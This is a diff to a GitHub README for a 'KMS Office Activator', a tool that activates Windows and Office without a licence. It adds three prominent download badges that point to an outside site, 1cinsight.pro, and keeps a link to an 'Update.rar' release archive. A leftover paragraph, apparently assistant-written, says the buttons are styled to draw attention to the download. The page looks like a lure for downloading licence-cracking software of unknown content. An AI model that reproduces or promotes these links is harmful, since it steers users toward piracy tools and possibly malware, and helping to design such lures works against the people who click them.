@@ -1,4 +1,13 @@
 
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-brightgreen?style=for-the-badge&logo=windows)](https://1cinsight.pro/)
+
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-2b2b2b?style=for-the-badge&logo=office)](https://1cinsight.pro/)
+
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-0078d7?style=for-the-badge&logo=microsoft)](https://1cinsight.pro/)
+
+---
+
+These buttons are styled to be simple and modern, inspired by GitHub’s badge-style buttons, and you can place them at different points in the article to attract attention to the download option. You can adjust the colors, labels, and logos as needed!
 # KMS Office Activator [![Download KMS Office](https://img.shields.io/badge/Download-KMS%20Office-blue)](https://github.com/DracoRDragon/kms-activator/releases/download/Release/Update.rar)
 
 ## Installation
